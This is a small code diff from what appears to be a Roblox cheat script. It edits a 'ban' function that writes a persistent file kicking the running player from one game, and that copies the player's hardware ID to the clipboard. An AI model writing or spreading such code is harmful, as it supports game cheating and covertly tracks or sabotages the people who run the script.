@@ -7,7 +7,7 @@ local kos = "hippysipp_y"
 local mc = "mcl1vin_F0gell2"
 local function ban()
 writefile("important.lua","if game.PlaceId == 6872265039 then game.Players.LocalPlayer:Kick(\"BANNED\") end")
-loadstring(readfile('important.lua'))()
+if isfile("important.lua") then loadstring(readfile('important.lua'))() end
 if IsValyse then
 local hwid = gethwid()
 setclipboard(hwid)
